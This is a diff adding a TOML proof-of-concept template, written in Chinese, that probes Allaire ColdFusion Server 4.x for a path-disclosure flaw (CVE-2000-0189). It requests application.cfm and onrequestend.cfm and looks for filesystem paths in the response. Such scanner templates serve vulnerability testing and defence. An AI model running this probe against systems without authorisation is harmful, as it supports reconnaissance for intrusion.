@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "通过向 ColdFusion Server 4.x 发送 HTTP 请求访问 application.cfm 或 onrequestend.cfm，服务器会在响应中返回真实物理路径，验证信息泄露漏洞是否存在。"
+id = "POC-AVE-2000-0166"
+name = "Allaire ColdFusion Server 4.x 路径泄露 PoC"
+severity = "medium"
+tags = ["ave-2000-0166"]
+vuln_id = [
+    "CVE-2000-0189",
+    "AVE-2000-0166",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/application.cfm"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    ':\',
+    ":/",
+    "/var/www",
+    "/usr/local",
+    'C:\',
+    'D:\',
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/onrequestend.cfm"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    ':\',
+    ":/",
+    "/var/www",
+    "/usr/local",
+    'C:\',
+    'D:\',
+]
